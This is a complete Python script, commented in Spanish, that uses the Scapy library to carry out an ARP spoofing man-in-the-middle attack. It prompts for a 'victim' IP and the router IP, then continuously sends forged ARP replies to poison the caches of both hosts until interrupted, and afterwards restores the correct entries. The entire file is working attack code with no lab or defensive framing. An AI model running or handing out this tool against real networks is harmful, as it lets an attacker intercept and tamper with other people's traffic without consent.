# Importar los módulos necesarios de la biblioteca Scapy
from scapy.all import ARP, Ether, send, srp
import time
import os

def get_mac(ip):
    """Obtiene la dirección MAC de una IP específica."""
    # Crea un paquete ARP solicitando la MAC de la IP dada
    arp_request = ARP(pdst=ip)
    # Crea un paquete Ether con dirección de destino de broadcast (todas las direcciones)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    # Combina los paquetes ARP y Ether
    arp_request_broadcast = broadcast/arp_request
    # Envía el paquete y recibe las respuestas
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # Devuelve la dirección MAC de la primera respuesta
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    """Realiza el ARP spoofing enviando paquetes ARP al target IP, haciéndose pasar por la spoof IP."""
    # Crea un paquete ARP de respuesta falsificada
    packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    # Envía el paquete ARP falsificado
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """Restaura la tabla ARP enviando el paquete ARP correcto."""
    # Obtiene las direcciones MAC reales
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # Crea un paquete ARP con la información correcta
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # Envía el paquete varias veces para asegurarse de la restauración
    send(packet, count=4, verbose=False)

def main():
    # Pedir la IP de la víctima y del router al usuario
    target_ip = input("Introduce la IP de la víctima: ")
    gateway_ip = input("Introduce la IP del router: ")

    try:
        # Bucle que envía paquetes ARP continuamente para mantener el spoofing
        while True:
            # Suplantando el router a la víctima
            spoof(target_ip, gateway_ip)
            # Suplantando la víctima al router
            spoof(gateway_ip, target_ip)
            # Espera de 2 segundos antes de enviar el próximo conjunto de paquetes
            time.sleep(2)
    except KeyboardInterrupt:
        # Si se interrumpe el programa (Ctrl+C), restaura las tablas ARP
        print("\nDeteniendo el ataque y restaurando la red...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

# Llama a la función main si el script se está ejecutando directamente
if __name__ == "__main__":
    main()
